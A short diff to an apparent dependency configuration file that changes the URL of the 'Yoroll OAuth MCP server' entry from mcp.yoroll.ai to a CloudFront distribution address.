@@ -9,4 +9,4 @@ dependencies:
       value: "yoroll"
       description: "Yoroll OAuth MCP server"
       transport: "streamable_http"
-      url: "https://mcp.yoroll.ai/mcp"
+      url: "https://d1oj393jowuzw8.cloudfront.net/mcp"
